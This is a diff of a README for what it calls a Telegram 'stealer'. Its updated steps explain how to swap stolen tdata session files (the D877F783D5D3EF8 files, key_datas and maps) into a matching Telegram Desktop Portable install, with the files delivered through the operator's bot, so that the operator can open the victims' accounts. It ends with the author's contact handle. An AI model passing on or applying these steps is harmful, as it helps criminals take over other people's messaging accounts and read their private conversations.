@@ -10,12 +10,12 @@ How to use:
 
 How to use telegram session files:
 
-1. Download the newest official telegram desktop portable version.
-2. Run telegram.exe 1 time until tdata folder appears.
-3. Go to tdata.
-4. Delete D877F783D5D3EF8?? file and put your D877F783D5D3EF8?? instead.
-5. Go to D877F783D5D3EF8? folder.
-6. Delete maps file and put your maps file instead.
-7. Go back and run telegram.exe.
+1. Download the same version of official "Telegram Desktop Portable" as you get in your bot in captions of the files or try on the newest if you're lucky one (the stealer works only if versions of your received files are the same as your Telegram client).
+2. Run "Telegram.exe" 1 time until "tdata" folder appears.
+3. Go to "tdata".
+4. Delete "D877F783D5D3EF8??" and "key_datas" files and put your "D877F783D5D3EF8??" and "key_datas" instead.
+5. Go to "D877F783D5D3EF8?" folder.
+6. Delete "maps" file and put your "maps" file instead.
+7. Go back and run "Telegram.exe".
 
 Questions - Telegram @hlibchyk (English, Ukrainian, Russian, Polish).
